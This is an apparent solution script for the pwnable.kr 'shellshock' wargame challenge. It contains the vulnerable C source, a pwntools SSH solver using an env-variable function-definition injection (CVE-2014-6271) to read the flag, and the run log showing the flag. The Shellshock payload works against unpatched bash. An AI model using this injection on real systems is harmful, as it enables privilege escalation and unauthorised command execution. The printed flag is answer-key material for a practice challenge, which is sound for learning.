'''
Description:

    Mommy, there was a shocking news about bash.
    I bet you already know, but lets just make it sure :)

    ssh shellshock@pwnable.kr -p2222 (pw:guest)

Source of shellshock.c:

    #include <stdio.h>
    int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
    }

Solution

Solver:
'''

from pwn import *

user = 'shellshock'
passwd = 'guest'
host = 'pwnable.kr'
port = 2222
command = 'env x="() { :;}; /bin/cat flag" ./shellshock'

s = ssh(user, host, port, passwd)
flag, status = s.run_to_end(command)
print '[+] Flag:', flag
s.close()

'''
Log:

[+] Connecting to pwnable.kr on port 2222: Done
[+] Flag: only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault

[*] Closed connection to 'pwnable.kr'

'''
